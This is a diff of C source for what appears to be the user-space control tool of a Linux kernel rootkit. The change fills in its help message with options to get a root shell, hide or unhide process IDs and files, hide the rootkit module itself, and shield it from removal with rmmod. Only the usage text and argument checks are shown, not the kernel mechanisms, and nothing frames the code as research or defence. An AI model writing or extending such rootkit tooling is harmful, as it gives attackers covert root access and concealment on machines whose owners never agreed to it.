@@ -9,14 +9,24 @@
 void printHelp(char **argv){
     printf(
             "Usage: %s [OPTION]...\n"
-            "\nblah blah blah"
-            );
+            "\n"
+            "Options:\n"
+            "  --root-shell            Grants you root shell access.\n"
+            "  --hide-pid=PID          Hides the specified PID.\n"
+            "  --unhide-pid=PID        Unhides the specified PID.\n"
+            "  --hide-file=FILENAME    Hides the specified FILENAME globally.\n"
+            "                          Must be a filename without any path.\n"
+            "  --unhide-file=FILENAME  Unhides the specified FILENAME.\n"
+            "  --hide                  Hides the rootkit LKM.\n"
+            "  --unhide                Unhides the rootkit LKM.\n"
+            "  --help                  Print this help message.\n"
+            "  --protect               Protects the rootkit from rmmod.\n"
+            "  --unprotect             Disables the rmmod protection.\n\n", argv[0]);
 }
 
 void handle_command(int argc, char **argv, int *root, int *hide, int *unhide){
     if (argc < 2) {
         fprintf(stderr, "Error: No arguments provided.\n\n");
-        // Does this work???
         printHelp(argv);
         exit(1);
     } else if (argc > 2){
@@ -24,6 +34,7 @@ void handle_command(int argc, char **argv, int *root, int *hide, int *unhide){
         printHelp(argv);
         exit(1);
     }
+
     /***
      * If getopt() does not recognize an option character, it prints an error
      * message to stderr, stores the character in optopt, and returns '?'. The
